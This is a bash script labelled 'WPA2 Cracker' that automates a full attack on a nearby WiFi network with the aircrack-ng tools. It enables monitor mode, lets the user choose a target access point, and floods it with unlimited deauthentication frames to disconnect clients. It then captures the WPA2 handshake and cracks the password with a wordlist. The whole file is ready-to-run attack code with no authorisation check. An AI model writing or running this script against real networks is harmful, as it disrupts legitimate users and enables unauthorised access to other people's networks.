#!/bin/bash

# ==========================
# Check required tools
# ==========================
for tool in airmon-ng airodump-ng aireplay-ng aircrack-ng iw figlet; do
    command -v $tool >/dev/null 2>&1 || { echo >&2 "$tool not found. Please install it."; exit 1; }
done

# ==========================
# Parse arguments
# ==========================
usage() {
    echo "Usage: $0 -i <interface> -w <wordlist>"
    echo "Example: $0 -i wlan0 -w wordlist.txt"
    exit 1
}

while getopts ":i:w:" opt; do
    case $opt in
        i) iface="$OPTARG" ;;
        w) wordlist="$OPTARG" ;;
        *) usage ;;
    esac
done

# Check if arguments are set
if [ -z "$iface" ] || [ -z "$wordlist" ]; then
    usage
fi

# Check if wordlist exists
if [ ! -f "$wordlist" ]; then
    echo "Wordlist file not found: $wordlist"
    exit 1
fi

# ==========================
# Enable monitor mode
# ==========================
figlet "WPA2 Cracker"
airmon-ng check kill >/dev/null 2>&1
airmon-ng start "$iface" >/dev/null 2>&1

mon_iface=$(iw dev | awk '/Interface/ {print $2}' | grep "$iface")
if [ -z "$mon_iface" ]; then
    echo "[-] Monitor interface not found."
    exit 1
fi
echo "[*] Using monitor interface: $mon_iface"

# ==========================
# Handle CTRL+C
# ==========================
cleanup() {
    echo "[*] Cleaning up..."
    pkill -f "airodump-ng.*$mon_iface" >/dev/null 2>&1
    pkill -f "aireplay-ng.*$mon_iface" >/dev/null 2>&1
    airmon-ng stop "$mon_iface" >/dev/null 2>&1
    service NetworkManager restart
    echo "[*] Done."
    exit 0
}
trap cleanup INT

# ==========================
# Scan for networks
# ==========================
echo "=================================================================="
echo "   Scanning nearby wireless networks on $mon_iface"
echo "   Press CTRL+C after a few seconds to stop scanning"
echo "=================================================================="

airodump-ng "$mon_iface" &
scan_pid=$!
sleep 9
kill $scan_pid
wait $scan_pid 2>/dev/null
echo "=================================================================="

# Ask user for BSSID and channel
read -p "Enter target BSSID: " bssid
read -p "Enter target channel: " channel

echo "=================================================================="
echo "You selected: BSSID: $bssid on Channel: $channel"
echo "=================================================================="

# ==========================
# Start handshake capture
# ==========================
echo "[*] Starting handshake capture..."
airodump-ng -c "$channel" --bssid "$bssid" -w handshake "$mon_iface" >/dev/null 2>&1 &
dump_pid=$!
sleep 3

# ==========================
# Start deauthentication attack
# ==========================
echo "[*] Launching deauth attack on $bssid..."
aireplay-ng --deauth 0 -a "$bssid" "$mon_iface" >/dev/null 2>&1 &
deauth_pid=$!

echo "=================================================================="
echo "[*] Waiting for handshake..."
echo "=================================================================="

# ==========================
# Check handshake
# ==========================
while true; do
    if aircrack-ng handshake-01.cap -w /dev/null 2>/dev/null | grep -q "1 handshake"; then
        echo "[*] Handshake captured!"
        kill $deauth_pid >/dev/null 2>&1
        kill $dump_pid >/dev/null 2>&1
        echo "[*] Deauth stopped."
        break
    fi
    sleep 2
done

echo "=================================================================="
echo "[*] Handshake saved as: handshake-01.cap"
echo "=================================================================="

# ==========================
# Start cracking with aircrack-ng
# ==========================
echo "[*] Starting password cracking with wordlist: $wordlist"
aircrack-ng handshake-01.cap -w "$wordlist"
